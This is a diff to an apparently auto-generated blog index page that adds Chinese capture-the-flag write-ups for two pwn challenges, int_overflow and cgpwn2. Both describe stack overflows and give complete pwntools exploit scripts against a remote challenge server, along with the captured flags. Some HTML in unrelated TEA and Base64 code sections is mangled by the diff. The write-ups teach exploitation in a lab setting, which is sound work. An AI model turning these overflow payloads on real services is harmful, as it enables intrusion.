@@ -372,6 +372,112 @@ sh<span class="token punctuation">.</span>interactive<span class="token punctuat
             </figure>
 
 <p>得到flag:cyberpeace{de6b4ebe0aab9472c1dda38729fc76ef}</p>
+<h2 id="int-overflow"><a href="#int-overflow" class="headerlink" title="int_overflow"></a>int_overflow</h2><figure class="image-box">
+                <img src="https://ae01.alicdn.com/kf/H8e47c49cc69745ef8f0dd69edf28ec14I.png" alt title class>
+                <p></p>
+            </figure>
+
+<p>先跑下 发现是一个类似登陆的系统 要求输入密码bulabula…没啥直接思路</p>
+<p>32位的程序 丢进IDA看下程序流程</p>
+<figure class="image-box">
+                <img src="https://ae01.alicdn.com/kf/H1e6e4439979b4a85a11b2a8ff19862ber.png" alt title class>
+                <p></p>
+            </figure>
+
+<p>主函数还是一样的寂寞..什么有价值的都没有呢…但是在函数表里发现一个敏感函数what_is_this</p>
+<figure class="image-box">
+                <img src="https://ae01.alicdn.com/kf/H3c6b0310b34e46738863aee4be442848Z.png" alt title class>
+                <p></p>
+            </figure>
+
+<p>那起码能确定肯定是溢出类的题目了 最后劫持程序流向what_is_this函数</p>
+<p>跟进login函数 也没啥发现 check函数主要就是录入了用户名和密码 本来看见read函数 以为溢出点就在这里了..打开栈图一看发现覆盖不到返回地址…继续向下跟进check_passwd函数</p>
+<figure class="image-box">
+                <img src="https://ae01.alicdn.com/kf/H431013789c004197b1ef8984139dbefbQ.png" alt title class>
+                <p></p>
+            </figure>
+
+<figure class="image-box">
+                <img src="https://ae01.alicdn.com/kf/Hdf7b08d1a7d94d128d68c1a1df79bc7fC.png" alt title class>
+                <p></p>
+            </figure>
+
+<p>简单解释下程序流程 这里的s就是之前我们录入的密码 check_passwd函数首先检测s的长度 要求s的长度在3到8之间</p>
+<p>在走过if后 发现另外一个敏感函数 <kbd>strcpy</kbd> 这个函数一样不检测长度 可以直接覆盖无限大的空间..<br>查看一下栈图 dest函数到返回地址的距离是14个字节 但是我们的密码最多只能输入8位…这时候注意到题目名..整型溢出..百度了一下..</p>
+<p>注意一下变量v3的定义方式 是一个八位的无符号整型数 也就是最大255 如果大于255 就会清零从头计数 那么基本思路就有了 简单来说就是将密码长度设为258-263位之间 同时对应好位置 直接把返回地址覆写即可</p>
+<p>那么..日常码脚本..</p>
+<pre class=" language-python"><code class="language-python"><span class="token keyword">from</span> pwn <span class="token keyword">import</span> <span class="token operator">*</span>
+context<span class="token punctuation">.</span>log_level <span class="token operator">=</span> <span class="token string">'debug'</span>
+sh<span class="token operator">=</span>remote<span class="token punctuation">(</span><span class="token string">"111.198.29.45"</span><span class="token punctuation">,</span><span class="token string">"34902"</span><span class="token punctuation">)</span>
+sh<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">"Your choice:"</span><span class="token punctuation">)</span>
+sh<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span><span class="token string">"1"</span><span class="token punctuation">)</span>
+sh<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">"Please input your username:"</span><span class="token punctuation">)</span>
+sh<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span><span class="token string">"Dust"</span><span class="token punctuation">)</span>
+sh<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">"Please input your passwd:"</span><span class="token punctuation">)</span>
+elf<span class="token operator">=</span>ELF<span class="token punctuation">(</span><span class="token string">"./int_overflow"</span><span class="token punctuation">)</span>
+what_is_this<span class="token operator">=</span>elf<span class="token punctuation">.</span>symbols<span class="token punctuation">[</span><span class="token string">'what_is_this'</span><span class="token punctuation">]</span>
+payload<span class="token operator">=</span><span class="token string">'a'</span><span class="token operator">*</span><span class="token number">0x18</span><span class="token operator">+</span>p32<span class="token punctuation">(</span>what_is_this<span class="token punctuation">)</span><span class="token operator">+</span><span class="token string">'a'</span><span class="token operator">*</span><span class="token number">0xE7</span>
+<span class="token keyword">print</span><span class="token punctuation">(</span>len<span class="token punctuation">(</span>payload<span class="token punctuation">)</span><span class="token punctuation">)</span>
+sh<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span>payload<span class="token punctuation">)</span>
+sh<span class="token punctuation">.</span>interactive<span class="token punctuation">(</span><span class="token punctuation">)</span></code></pre>
+<p>运行脚本即可</p>
+<figure class="image-box">
+                <img src="https://ae01.alicdn.com/kf/H646dc7782e7f4029a6dadd5251eda1f65.png" alt title class>
+                <p></p>
+            </figure>
+
+<p>得到flag:cyberpeace{85f5a37cbe589f048f01f85b41e6f421}</p>
+<h2 id="cgpwn2"><a href="#cgpwn2" class="headerlink" title="cgpwn2"></a>cgpwn2</h2><p>保护</p>
+<figure class="image-box">
+                <img src="https://ae01.alicdn.com/kf/H291662a9388b451f96af988216f86aa5A.png" alt title class>
+                <p></p>
+            </figure>
+
+<p>运行程序啥都看不出来 就让输入个用户名和留言 拖入IDA吧</p>
+<figure class="image-box">
+                <img src="https://ae01.alicdn.com/kf/He43b12a532d641dba8da9e19bcd2dc86d.png" alt title class>
+                <p></p>
+            </figure>
+
+<p>主函数什么都没有 直接往下跟</p>
+<figure class="image-box">
+                <img src="https://ae01.alicdn.com/kf/Hec3d211d6b3c4119b1af6b27a21cf1feE.png" alt title class>
+                <p></p>
+            </figure>
+
+<p>在hello函数的最后发现敏感函数gets 不用纠结函数上面写的是在干嘛..反正对函数主体以及我们的输入没有关系 不用管..同时在函数表中发现<kbd>system</kbd>函数 那么基本思路明确 通过gets函数劫持程序流向system函数 直接在栈里构造出来system函数调用<kbd>/bin/bash</kbd>的情况即可</p>
+<p>接下来就是脚本了</p>
+<pre class=" language-python"><code class="language-python"><span class="token keyword">from</span> pwn <span class="token keyword">import</span> <span class="token operator">*</span>
+context<span class="token punctuation">.</span>log_level <span class="token operator">=</span> <span class="token string">'debug'</span>
+elf<span class="token operator">=</span>ELF<span class="token punctuation">(</span><span class="token string">"./cgpwn2"</span><span class="token punctuation">)</span>
+sh<span class="token operator">=</span>remote<span class="token punctuation">(</span><span class="token string">"111.198.29.45"</span><span class="token punctuation">,</span><span class="token string">"34584"</span><span class="token punctuation">)</span>
+<span class="token comment" spellcheck="true">#sh=process("./cgpwn2")</span>
+sh<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">"please tell me your name"</span><span class="token punctuation">)</span>
+sh<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span><span class="token string">"/bin/sh\x00"</span><span class="token punctuation">)</span>
+sh<span class="token punctuation">.</span>recvline<span class="token punctuation">(</span><span class="token string">"hello,you can leave some message here:"</span><span class="token punctuation">)</span>
+sysaddr<span class="token operator">=</span>elf<span class="token punctuation">.</span>symbols<span class="token punctuation">[</span><span class="token string">'system'</span><span class="token punctuation">]</span>
+binaddr<span class="token operator">=</span><span class="token number">0x0804A080</span>
+payload<span class="token operator">=</span><span class="token string">"a"</span><span class="token operator">*</span><span class="token number">0x2A</span><span class="token operator">+</span>p32<span class="token punctuation">(</span>sysaddr<span class="token punctuation">)</span><span class="token operator">+</span>p32<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token operator">+</span>p32<span class="token punctuation">(</span>binaddr<span class="token punctuation">)</span>
+sh<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span>payload<span class="token punctuation">)</span>
+sh<span class="token punctuation">.</span>interactive<span class="token punctuation">(</span><span class="token punctuation">)</span></code></pre>
+<blockquote>
+<p>这里解释下脚本为什么在名字部分写入/bin/sh而binaddr又是什么东西<br>因为在编写脚本的时候 我们不可能直接将字符串写入栈 让system函数去调用 需要我们提前将/bin/sh写入程序 而上面的名字录入就是一个最好的位置</p>
+<p>我们可以看一下name变量存在的位置</p>
+<figure class="image-box">
+                <img src="https://ae01.alicdn.com/kf/H159c90dd87c9421292ac5b7a69ce4e34o.png" alt title class>
+                <p></p>
+            </figure>
+
+<p>可以明确看到 name变量是存在bss段的静态变量 我们完全可以把/bin/sh先写入name变量 然后让system函数去调用</p>
+</blockquote>
+<p>执行脚本即可</p>
+<figure class="image-box">
+                <img src="https://ae01.alicdn.com/kf/Ha63ae34bd918413e852ef834e5940b7em.png" alt title class>
+                <p></p>
+            </figure>
+
+<p>得到flag:cyberpeace{d0a41c2065b348cf58cbb94c96ee57e6}</p>
+<h2 id="level-3"><a href="#level-3" class="headerlink" title="level_3"></a>level_3</h2><p>该题附件缺失 少了一个libc文件 没啥办法..略..</p>
 <script>
         document.querySelectorAll('.github-emoji')
           .forEach(el => {
@@ -736,9 +842,7 @@ int main(void)
 {
     int i=0;
     EnBase64();
-    cout<<ans;
-
-} </code></pre>
+    cout<<ans; } < code></ans;></iostream></code></pre><code class="language-C">
 <h2 id="Tea"><a href="#Tea" class="headerlink" title="Tea"></a>Tea</h2><p>在密码学中，微型加密算法（Tiny Encryption Algorithm，TEA）是一种易于描述和执行的块密码，通常只需要很少的代码就可实现。其设计者是剑桥大学计算机实验室的大卫 · 惠勒与罗杰 · 尼达姆</p>
 <p>Tea的实现代码比较固定 这里给出常见Tea加密的实现代码</p>
 <pre class=" language-C"><code class="language-C">#include <stdint.h>
@@ -765,7 +869,7 @@ void decrypt (uint32_t* v, uint32_t* k) {
         sum -= delta;                                   
     }                                              /* end cycle */
     v[0]=v0; v[1]=v1;
-}</code></pre>
+}</stdint.h></code></pre>
 <p>Tea加密的明显特征是 ==存在一个Image Number:0x9e3779b9== </p>
 <h2 id="MD5"><a href="#MD5" class="headerlink" title="MD5"></a>MD5</h2><p>MD5 消息摘要算法（英语：MD5 Message-Digest Algorithm），一种被广泛使用的密码散列函数，可以产生出一个 128 位（16 字节）的散列值（hash value），用于确保信息传输完整一致。MD5 由美国密码学家罗纳德 · 李维斯特（Ronald Linn Rivest）设计，于 1992 年公开，用以取代 MD4 算法。这套算法的程序在 RFC 1321 中被加以规范</p>
 <p>这里给出MD5实现的伪代码</p>
@@ -849,7 +953,7 @@ void decrypt (uint32_t* v, uint32_t* k) {
             });
             document.body.appendChild(img);
           });
-      </script></body></html>]]></content>
+      </script></code></body></html>]]></content>
       
         
         <tags>
